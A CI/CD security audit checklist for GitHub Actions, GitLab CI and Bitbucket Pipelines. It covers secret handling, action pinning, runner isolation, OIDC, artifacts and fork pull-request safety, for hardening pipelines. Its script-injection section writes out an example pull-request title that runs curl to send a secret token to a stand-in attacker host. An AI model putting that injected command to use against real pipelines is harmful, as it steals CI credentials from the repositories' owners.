# CI/CD Security Checklist

Scope: CI/CD security review across GitHub Actions, GitLab CI, and Bitbucket Pipelines. OpenID Connect (OIDC) is a short-lived identity token flow; PR and MR mean pull request and merge request. This checklist is local guidance, not proof that a hosted control is enabled.

Audit checklist for pipeline security across platforms.

## Secrets

- [ ] No secrets in pipeline YAML files - use platform secrets/variables
- [ ] Tokens have minimal scope (repo-only, not org-wide)
- [ ] Short-lived tokens preferred over long-lived PATs
- [ ] Keep secrets out of echoed, logged, and printed error messages
- [ ] Debug mode (`ACTIONS_STEP_DEBUG`, `CI_DEBUG_TRACE`) is off in production

## Branch protection

- [ ] `main`/`master` branch requires PR review before merge
- [ ] CI must pass before merge (status checks required)
- [ ] No direct push to protected branches
- [ ] Tag protection enabled (or restricted to specific roles)

## Pipeline integrity

- [ ] Third-party actions/packages pinned to a SHA, not a tag

  ```yaml
  # Bad: uses: actions/checkout@v4
  # Good: uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  ```

- [ ] Workflow triggers limited to expected events (no wildcard
  `pull_request_target`)
- [ ] `GITHUB_TOKEN` permissions set to minimum in each job:

  ```yaml
  permissions:
    contents: read
  ```

- [ ] No script injection from user-controlled input (PR titles, commit
messages, issue bodies)

## Runner security

- [ ] Self-hosted runners isolated from production infrastructure
- [ ] Ephemeral runners preferred over persistent ones
- [ ] Runner has no access to secrets it doesn't need

## OIDC (OpenID Connect)

- [ ] Cloud provider auth uses OIDC instead of long-lived secrets

  ```yaml
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789:role/github-actions
      aws-region: us-east-1
  ```

## Artifact safety

- [ ] Artifact expiry is explicitly configured (for example, GitLab `expire_in`); provider defaults vary and are not evidence of retention policy
- [ ] Build artifacts in public repos don't contain secrets
- [ ] Artifacts from forked PRs not accessible to unapproved contributors

## Supply chain

- [ ] Dependencies pinned (lockfile committed)
- [ ] `npm ci` not `npm install` (same for pip, cargo, etc.)
- [ ] SBOM generated and signed for releases

## Attack vectors

Specific attack patterns that CI/CD guardrails must block. Use the Git CI/CD
source map (see `sources.md`) for current provider security references; third-party
posts are not enforcement evidence.

### Script injection via PR title/body

```yaml
# BLOCKED - PR title flows directly into shell
- run: echo "${{ github.event.pull_request.title }}"
```

An attacker opens a PR with title `$(curl attacker.com/steal?token=$SECRET)`.
Fix: use environment variables.

```yaml
- run: echo "$PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### Malicious third-party actions

Unpinned actions from unverified sources. Anyone with commit access to the
action's repo can push a new version of a mutable tag. Always pin to SHA.

### Credential exfiltration via pull_request_target

When an outside contributor triggers `pull_request_target`, it runs in the
target repo context with full secrets. The PR code can exfiltrate tokens, push
to protected branches, or publish releases. Use `workflow_run` or `pull_request`
with `permissions:` and an approval gate.

### Artifact poisoning

Artifacts from fork PRs can contain malicious binaries. Never download artifacts
from untrusted workflows into privileged deployment jobs.

## Fork PR safety

For public repos that accept fork PRs:

```yaml
on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<sha>
      - run: npm test
      # NEVER: upload artifacts, use secrets, deploy, push
```

If a deployment needs secrets after a fork PR, separate untrusted tests from a
trusted, approval-gated job (for example, verify artifacts in `workflow_run`).
Do not execute fork-controlled code in a target-context workflow merely because
a label or condition matches; default: reject.

## Sources

- Git CI/CD source map (see `sources.md`) — provider URLs and freshness limits.
- [GitHub secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) and [GitLab CI/CD security guidance](https://docs.gitlab.com/security/hardening_cicd_recommendations/) — provider controls.
- [Creating Mermaid diagrams on GitHub (requested URL)](https://docs.github.com/get-started/writing-on-github/working-with-advanced-formatting/creating-diagrams#creating-mermaid-diagrams) — rendering requirements; exact URL was not retrievable in this pass, so treat rendering evidence as `UNVERIFIED`.
